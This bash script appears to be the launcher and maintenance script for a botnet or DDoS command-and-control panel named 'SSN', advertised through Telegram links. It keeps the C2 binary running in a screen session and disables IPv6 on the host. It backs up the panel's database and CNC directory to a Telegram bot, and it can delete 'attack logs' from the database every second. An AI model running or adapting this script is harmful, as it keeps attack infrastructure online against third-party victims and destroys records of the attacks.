#!/bin/bash

# https://t.me/tcpsyn_bot

####################################################################################################

# Here you can enable daily Telegram backups of your SSN files and database.

LOG_TO_TELEGRAM=false
BOT_TOKEN="Your Bot Token From https://t.me/BotFather"
CHAT_ID="To Get Your Chat ID, Visit: https://stackoverflow.com/questions/32423837/telegram-bot-how-to-get-a-group-chat-id"

CNC_DIRECTORY="/root/CNC"
DATABASE_FILENAME="/root/CNC/assets/logs/DATABASE.sql"
ZIP_FILENAME="/root/SSN_BACKUP.zip"
CLEAR_ATTACK_LOGS=false

####################################################################################################

# Do not touch anything below if you do not know what you are doing.

####################################################################################################

CONFIG_PATH="assets/config.json"
DB_HOST="localhost"
DB_USERNAME=$(jq -r '.database.username' "$CONFIG_PATH")
DB_PASSWORD=$(jq -r '.database.password' "$CONFIG_PATH")
DB_TABLE=$(jq -r '.database.table' "$CONFIG_PATH")
Q_MODE=true
PIDS=()
cleanup() {
    for pid in "${PIDS[@]}"; do
        kill "$pid" 2>/dev/null
    done
    exit 0
}
trap cleanup SIGINT

while true; do
    rm -rf "$DATABASE_FILENAME"
    rm -rf "$ZIP_FILENAME"
    if [ "$Q_MODE" = true ]; then
        mysqldump -u"$DB_USERNAME" -p"$DB_PASSWORD" "$DB_TABLE" > "$DATABASE_FILENAME" >/dev/null 2>&1
        zip -r "$ZIP_FILENAME" "$CNC_DIRECTORY" >/dev/null 2>&1
    else
        mysqldump -u"$DB_USERNAME" -p"$DB_PASSWORD" "$DB_TABLE" > "$DATABASE_FILENAME"
        zip -r "$ZIP_FILENAME" "$CNC_DIRECTORY"
    fi
    if [ "$LOG_TO_TELEGRAM" = true ]; then
        curl -F "chat_id=$CHAT_ID" -F "document=@$ZIP_FILENAME" "https://api.telegram.org/bot$BOT_TOKEN/sendDocument"
    fi
    echo -e "\nDone backing up to: $ZIP_FILENAME. Sleeping until: $(TZ=UTC date -d "tomorrow" +"%Y-%m-%d %H:%M:%S")."
    sleep 24h
done &
PIDS+=($!)

if [ "$CLEAR_ATTACK_LOGS" = true ]; then
    {
        mysql_command="DELETE FROM \`logs\` WHERE \`time_sent\` + \`duration\` < UNIX_TIMESTAMP()"
        execute_mysql_command() {
            if [ "$Q_MODE" = true ]; then
                mysql -h "$DB_HOST" -u "$DB_USERNAME" -p"$DB_PASSWORD" "$DB_TABLE" -e "$mysql_command" >/dev/null 2>&1
            else
                mysql -h "$DB_HOST" -u "$DB_USERNAME" -p"$DB_PASSWORD" "$DB_TABLE" -e "$mysql_command"
            fi
            if [ $? -eq 0 ]; then
                if [ "$Q_MODE" = false ]; then
                    echo "Database logs cleared successfully."
                fi
            else
                if [ "$Q_MODE" = false ]; then
                    echo "Error clearing database logs."
                fi
            fi
        }
        while true; do
            execute_mysql_command
            sleep 1s
        done
    } &
    PIDS+=($!)
fi
{
    start_SSN_in_screen() {
        cd "$CNC_DIRECTORY" || exit
        screen -d -m -S SSN_session ./SSN
    }
    is_SSN_session_running() {
        screen -ls | grep -q "SSN_session"
    }
    while true; do
        attempts=0
        while [ $attempts -lt 5 ]; do
            if ! is_SSN_session_running; then
                echo "Attempting to start SSN (Attempt $((attempts+1)) of 5)"
                sudo sysctl -w net.ipv6.conf.all.disable_ipv6=1 >/dev/null 2>&1
                sudo sysctl -w net.ipv6.conf.default.disable_ipv6 >/dev/null 2>&1
                sudo sysctl -w net.ipv6.conf.lo.disable_ipv6=1 >/dev/null 2>&1
                start_SSN_in_screen
                sleep 1s
            else
                echo "SSN is running."
                break
            fi
            attempts=$((attempts+1))
        done
        if ! is_SSN_session_running; then
            echo "AN ERROR OCCURRED WHEN STARTING SSN"
            echo ""
            echo "Running './SSN' to see the output:"
            cd "$CNC_DIRECTORY" || exit
            ./SSN
            echo ""
            echo "Sleeping for 15s before trying again."
            sleep 15s
        fi
        sleep 1s
    done
} &
PIDS+=($!)
wait



# Ignore # https://api.telegram.org/bot$BOT_TOKEN/getUpdates



# SSN on top! https://t.me/tcpsyn_bot / Space / https://t.me/tcpsyn